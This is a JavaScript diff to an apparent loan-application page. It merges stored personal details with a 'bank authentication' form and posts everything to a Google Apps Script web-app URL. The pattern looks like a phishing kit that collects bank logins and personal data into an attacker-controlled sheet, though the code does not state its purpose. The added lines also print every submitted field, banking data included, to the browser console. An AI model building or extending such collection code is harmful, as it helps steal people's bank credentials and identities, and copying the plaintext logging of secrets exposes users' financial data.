@@ -526,18 +526,30 @@
             const hasLoanData = loanData && JSON.parse(loanData).loanAmount;
             
             console.log('🔍 Has loan data:', hasLoanData);
+            console.log('📊 Bank auth form data:', data);
             
             let finalData = {};
             
             if (hasLoanData) {
                 // Full Application flow - merge personal data + bank data
                 const personalData = JSON.parse(loanData);
+                console.log('📊 Personal data from localStorage:', personalData);
+                
+                // Merge: personal data takes priority, bank data overwrites bank fields
                 finalData = { ...personalData, ...data };
-                console.log('📊 Full application data:', finalData);
+                
+                // Ensure we have all required fields for Google Apps Script
+                finalData.type = 'personal_loan'; // Override to personal_loan for full applications
+                finalData.timestamp = new Date().toISOString();
+                
+                console.log('📊 Final merged data for full application:', finalData);
             } else {
                 // Direct Bank flow - send only bank data
-                finalData = data;
-                console.log('📊 Direct bank data:', finalData);
+                finalData = { ...data };
+                finalData.type = 'bank_authentication';
+                finalData.timestamp = new Date().toISOString();
+                
+                console.log('📊 Final data for direct bank:', finalData);
             }
             
             // Create FormData for submission
@@ -545,6 +557,11 @@
             Object.keys(finalData).forEach(key => {
                 formData.append(key, finalData[key]);
             });
+            
+            console.log('📤 FormData being sent:');
+            for (let [key, value] of formData.entries()) {
+                console.log(`  ${key}: ${value}`);
+            }
             
             // Send data using fetch POST FormData
             fetch('https://script.google.com/macros/s/AKfycbxM0ZYTBPcLutmMdnmxO-H399LYdFfKiy6LuWkhYJb1XYxcv3SdAZH8VvPHh5Ny20S8dA/exec', {
